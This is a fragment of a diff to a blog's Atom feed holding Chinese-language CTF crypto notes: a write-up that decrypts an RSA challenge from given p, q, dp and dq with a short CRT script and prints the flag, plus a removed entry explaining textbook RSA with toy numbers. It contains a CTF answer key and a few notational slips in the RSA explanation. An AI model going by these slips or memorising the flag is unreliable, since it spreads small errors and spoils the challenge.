     <content type="html"><![CDATA[<p>p &#x3D; 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229<br>q &#x3D; 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469<br>dp &#x3D; 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929<br>dq &#x3D; 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041<br>c &#x3D; 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</p><p>&#x3D;&#x3D;dp,dq  是<code>d</code>模<code>p-1</code>和<code>q-1</code>的模逆元（在RSA中，它们通常用于快速解密，因为使用它们可以避免计算<code>d</code>，这是一个大数。&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes   #将长整数转化为字节字符串</span><br><span class="line"> </span><br><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br><span class="line"> </span><br><span class="line">I = gmpy2.invert(q, p) </span><br><span class="line"> # 计算了q模p的模逆元。在数学上，这意味着I是一个整数，使得q * I mod p = 1。注意，这里的I并不是中国剩余定理中常用的h（h是p模q的模逆元），但在这个上下文中，我们只需要I</span><br><span class="line"> </span><br><span class="line">mp = pow(c, dp, p)   #使用模幂运算，计算c的dp次方模p的结果。</span><br><span class="line">mq = pow(c, dq, q)   #使用模幂运算，计算c的dq次方模q的结果。</span><br><span class="line"> </span><br><span class="line">m = (((mp-mq) * I) % p) * q + mq      #CRT的一个变种，用于从mp和mq中恢复明文m</span><br><span class="line"> </span><br><span class="line">print(long_to_bytes(m))    #解密后的整数m转换为字节字符串并输出 </span><br></pre></td></tr></table></figure><p> b’noxCTF{W31c0m3_70_Ch1n470wn}’→flag{W31c0m3_70_Ch1n470wn}</p>]]></content>
     
@@ -438,35 +456,11 @@
   </entry>
   
   <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/cc5fb9611ed1.html"/>
-    <id>https://rhea006.github.io/2025/06/cc5fb9611ed1.html</id>
-    <published>2025-06-15T08:17:05.520Z</published>
-    <updated>2025-06-15T10:09:00.203Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>密钥计算方法</strong><br>1.选择两个大素数p和q(典型值为1024位)<br>2.计算<code>n=p×q</code>和<code>z=(p-1)×(q-1)</code><br>&#x2F;&#x2F; n表示欧拉函数<br>3.选择一个与z互质的数，令其为d<br>4.找到一个 e 使满足<code>exd= 1 (mod z)</code><br>5.公开密钥为<code>(e，m)</code>，私有密钥为<code>(d，m)</code><br><strong>密钥举例</strong><br>代码如下（示例）：1.假设需要加密的明文信息为m&#x3D;85，选择：e&#x3D;7，p&#x3D;11，q&#x3D;13，说明使用RSA算法的加密和解密(计算密文并还原)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n=p*q=11*13=143</span><br><span class="line">z=（p-1）*（q-1）=10*12=120</span><br><span class="line"></span><br><span class="line">e*d=1(mod z)  </span><br><span class="line">7 * d( mod 120)=1  -------d=103</span><br></pre></td></tr></table></figure><p>1️⃣加密运算<br>公钥:(e,n)&#x3D;(7,143)<br>密文c&#x3D;p^e (mod n)&#x3D;123<br>2️⃣加密运算<br>密钥:(d,n)&#x3D;(103,143)<br>明文：P&#x3D;c^d (mod n)&#x3D;85</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;密钥计算方法&lt;/strong&gt;&lt;br&gt;1.选择两个大素数p和q(典型值为1024位)&lt;br&gt;2.计算&lt;code&gt;n=p×q&lt;/code&gt;和&lt;code&gt;z=(p-1)×(q-1)&lt;/code&gt;&lt;br&gt;&amp;#x2F;&amp;#x2F; n表示欧拉函数&lt;br&gt;3.选择一个</summary>
-      
-    
-    
-    
-    <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
-    
-    <category term="非对称加密（Asymmetric Cryptography）" scheme="https://rhea006.github.io/categories/Crypto/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%EF%BC%88Asymmetric-Cryptography%EF%BC%89/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title></title>
-    <link href="https://rhea006.github.io/2025/06/1075e772c959.html"/>
-    <id>https://rhea006.github.io/2025/06/1075e772c959.html</id>
-    <published>2025-06-15T08:17:05.519Z</published>
-    <updated>2025-06-15T10:09:00.203Z</updated>
+    <title>r4</title>
+    <link href="https://rhea006.github.io/2025/06/e37fae821c0c.html"/>
+    <id>https://rhea006.github.io/2025/06/e37fae821c0c.html</id>
+    <published>2025-06-14T14:00:00.000Z</published>
+    <updated>2025-06-15T12:12:19.385Z</updated>
     
     
     
